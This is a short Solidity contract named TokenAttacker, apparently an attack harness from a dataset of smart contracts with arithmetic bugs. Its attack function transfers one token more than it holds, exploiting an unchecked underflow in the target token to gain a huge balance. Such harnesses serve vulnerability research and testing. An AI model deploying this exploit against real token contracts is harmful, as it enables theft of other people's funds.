pragma solidity ^0.8.0;

import "../dataset/arithmetic/token.sol";

 contract TokenAttacker {
  Token target;

  constructor (address _token) {
    target = Token(_token);
  }

  function attack(address to) public {
    uint256 balance = target.balanceOf(address(this));
    uint256 value = balance + 1;
    target.transfer(to, value);
  }

 }
